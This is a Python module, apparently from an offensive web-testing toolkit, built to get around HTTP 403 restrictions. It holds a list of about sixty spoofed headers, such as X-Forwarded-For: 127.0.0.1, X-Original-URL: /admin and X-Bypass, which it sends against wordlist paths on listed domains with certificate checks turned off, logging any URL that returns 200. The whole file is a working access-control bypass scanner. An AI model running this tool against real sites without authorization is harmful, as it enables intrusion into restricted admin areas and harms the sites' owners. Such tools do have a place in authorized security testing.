import requests
requests.packages.urllib3.disable_warnings()

from colorama import Fore, Style
import json
from core.utils import user_agent

def word_list(wordlist: str) -> str:
    try:
        with open(wordlist, "r") as f:
            data = [x.strip() for x in f.readlines()] 
        return data
    except FileNotFoundError as e:
        print(f"File not found: {e}")

def header_bypass():
    headers = [
        {'User-Agent': user_agent},
        {'User-Agent': str(user_agent), 'X-Custom-IP-Authorization': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-For': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-For': '127.0.0.1:80'},
        {'User-Agent': str(user_agent), 'X-Originally-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Originating-': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Originating-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'True-Client-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-WAP-Profile': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Arbitrary': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Proto': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'Destination': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Remote-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Client-IP': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Host': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Host': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Port': '4443'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Port': '80'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Port': '8080'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Port': '8443'},
        {'User-Agent': str(user_agent), 'X-ProxyUser-Ip': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'Client-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Real-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Original-URL': '/admin'},
        {'User-Agent': str(user_agent), 'X-Rewrite-URL': '/admin'},
        {'User-Agent': str(user_agent), 'X-Originating-URL': '/admin'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Server': 'localhost'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Scheme': 'http'},
        {'User-Agent': str(user_agent), 'X-Original-Remote-Addr': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Protocol': 'http'},
        {'User-Agent': str(user_agent), 'X-Original-Host': 'localhost'},
        {'User-Agent': str(user_agent), 'Proxy-Host': 'localhost'},
        {'User-Agent': str(user_agent), 'Request-Uri': '/admin'},
        {'User-Agent': str(user_agent), 'X-Server-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-SSL': 'off'},
        {'User-Agent': str(user_agent), 'X-Original-URL': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Client-Port': '443'},
        {'User-Agent': str(user_agent), 'X-Backend-Host': 'localhost'},
        {'User-Agent': str(user_agent), 'X-Remote-Addr': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Remote-Port': '443'},
        {'User-Agent': str(user_agent), 'X-Host-Override': 'localhost'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Server': 'localhost:80'},
        {'User-Agent': str(user_agent), 'X-Host-Name': 'localhost'},
        {'User-Agent': str(user_agent), 'X-Proxy-URL': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'Base-Url': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'HTTP-X-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'HTTP-Client-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'HTTP-X-Real-IP': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'Proxy-Url': 'http://127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forward-For': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Originally-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'Forwarded-For-Ip': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-By': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-For-Original': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Forwarded-Host-Original': 'localhost'},
        {'User-Agent': str(user_agent), 'X-Pwnage': '127.0.0.1'},
        {'User-Agent': str(user_agent), 'X-Bypass': '127.0.0.1'},

    ]
    return headers

def save_forbidden_bypass(url):
    with open("forbidden_bypass.txt", "a") as f:
        f.write(f"{url}\n")

def do_request(url: str, stream=False):
    headers = header_bypass()
    try:
        for header in headers:
            if stream:
                s = requests.Session()
                r = s.get(url, stream=True, headers=header, verify=False, timeout=10)
            else:
                s = requests.Session()
                r = s.get(url, headers=header, verify=False, timeout=10)
            if r.status_code == 200:
                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.GREEN + " [{}]".format(r.status_code))
                save_forbidden_bypass(url)
            elif r.status_code == 403:
                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.RED + " [{}]".format(r.status_code))
            else:
                print(Fore.WHITE + url + ' ' + json.dumps(list(header.items())[-1]) + Fore.RED + " [{}]".format(r.status_code))
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.RequestException:
        pass

def load_domains(filename: str) -> list:
    try:
        with open(filename, "r") as f:
            return [x.strip() for x in f.readlines()]
    except FileNotFoundError as e:
        print(f"{Fore.RED}Domain file not found: {e}{Style.RESET_ALL}")
        return []

def scan_domain(domain: str, wordlist: list):
    if not domain.startswith(('http://', 'https://')):
        domain = f"https://{domain}"
    print(f"\n{Fore.YELLOW}Scanning domain: {domain}{Style.RESET_ALL}")
    for bypass in wordlist:
        links = f"{domain}{bypass}"
        do_request(links)
